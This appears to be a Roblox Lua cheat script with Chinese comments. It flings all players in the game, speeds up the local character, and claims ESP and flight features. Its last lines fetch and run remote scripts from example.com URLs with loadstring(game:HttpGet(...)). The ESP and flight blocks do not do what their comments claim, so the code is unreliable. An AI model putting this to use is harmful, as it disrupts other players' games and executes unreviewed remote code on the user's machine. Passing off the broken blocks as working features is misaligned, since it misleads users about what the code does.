for _, player in ipairs(game.Players:GetPlayers()) do
    if player.Character then
        local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.Velocity = Vector3.new(0, 100, 0) -- 甩飞所有人
        end
    end
end

local player = game.Players.LocalPlayer
if player.Character then
    local humanoid = player.Character:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 50 -- 设置移动速度
    end
end

game:GetService("Workspace").CurrentCamera:ClearAllChildren() -- 透视玩家

local player = game.Players.LocalPlayer
local character = player.Character
if character then
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if humanoidRootPart then
        humanoidRootPart.Velocity = Vector3.new(0, 0, 0) -- 飞行功能
        humanoidRootPart.Gravity = 0
    end
end

loadstring(game:HttpGet("https://example.com/inkgame.lua"))() -- 墨水游戏脚本

getgenv().XiaoPi="1002100032" -- 皮脚本
loadstring(game:HttpGet("https://example.com/piscript.lua"))()
